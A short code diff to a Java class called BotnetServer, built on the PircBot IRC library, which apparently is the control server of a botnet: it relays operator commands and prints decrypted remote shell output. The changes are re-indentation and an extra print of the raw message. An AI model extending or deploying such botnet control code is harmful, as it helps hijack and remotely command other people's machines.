@@ -173,9 +173,9 @@ public class BotnetServer extends PircBot {
 		String message = input.nextLine();
 		while(!message.toLowerCase().equalsIgnoreCase("q")) {
 			try {
-			performCommand(message);
-			System.out.print("Command: ");
-			message = input.nextLine();
+				performCommand(message);
+				System.out.print("Command: ");
+				message = input.nextLine();
 			} catch (Exception e) {
 				System.out.println("Can't perform command on the message");
 			}
@@ -358,7 +358,9 @@ public class BotnetServer extends PircBot {
 			try {
 				// TODO: decrypt this
 				//System.out.print(shellout.nextLine());
-				System.out.println(masterMsgE.decryptMsg(shellout.nextLine()));
+				String msg = shellout.nextLine();
+				System.out.println(msg);
+				System.out.println(masterMsgE.decryptMsg(msg));
 				
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
